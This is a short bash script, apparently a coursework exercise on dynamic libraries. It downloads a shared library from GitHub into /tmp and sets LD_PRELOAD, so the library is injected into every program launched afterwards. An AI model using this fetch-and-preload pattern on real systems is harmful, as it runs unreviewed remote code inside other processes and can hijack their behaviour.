#!/bin/bash
wget -P /tmp https://github.com/ouarrar/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libhidden.so
export LD_PRELOAD=/tmp/libhidden.so
